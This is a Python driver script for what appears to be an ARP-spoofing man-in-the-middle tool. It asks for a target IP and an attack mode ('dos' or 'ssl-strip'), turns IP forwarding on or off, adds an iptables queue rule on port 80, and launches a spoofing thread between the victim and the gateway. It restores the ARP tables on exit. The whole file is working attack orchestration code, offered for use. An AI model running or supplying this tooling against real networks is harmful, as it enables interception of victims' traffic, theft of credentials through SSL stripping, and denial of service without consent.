import threading
import time

from networking import *
from arpspoof import *
from server import *
from modules import *

PORT = 80

def main():
    # Start a Server for testing purposes
    server = Server()
    server_thread = threading.Thread(target=server.start, args=(PORT,))
    server_thread.daemon = True
    server_thread.start()

    # Wait for the server to start
    while not server.is_ready():
        time.sleep(0.1)
    
     # Arp spoofing setup
    arp_spoofer = ArpSpoofer()
    target_ip = input("\nTarget IP: ")
    gateway_ip = get_default_gateway_ip()

    # Ask for attack mode
    mode = ""
    if "dos" not in mode or "ssl-strip" not in mode:
        mode = input("Attack Mode: ")

    # Enable/Disable ip_forwarding based on mode
    if "dos" in mode.lower(): 
        set_ip_forwarding(False)
        server.stop()
    else: set_ip_forwarding(True)

    print(f"\nSet ipForwarding: {get_ip_forwarding()}\n")

    # Enable queueing rule in iptables
    queue_iptables_rule(True, PORT)
    print(f"Modified ipTable:\n {get_iptables_rules()}")

    try:
        # Begin Spoofing on separate thread
        spoof_thread = threading.Thread(target=arp_spoofer.spoof, args=(gateway_ip, target_ip))
        spoof_thread.daemon = True
        spoof_thread.start()

        # Continue main thread...
        print("\nContinuing...")

        # Rejoin all threads to main thread
        if "dos" not in mode.lower(): server_thread.join()
        spoof_thread.join()

    except KeyboardInterrupt:
        # Restore ARP tables and remove the AITM position
        arp_spoofer.cleanup(gateway_ip, target_ip)
        if "dos" not in mode.lower(): server.stop()
        
        # Disable IP_Forwarding (Default)
        set_ip_forwarding(False)
        print(f"\nSet ipForwarding: {get_ip_forwarding()}\n")

        # Remove queueing rule in iptables
        queue_iptables_rule(False, PORT)
        print(f"Restored ipTable:\n {get_iptables_rules()}")

if __name__ == "__main__":
    main()

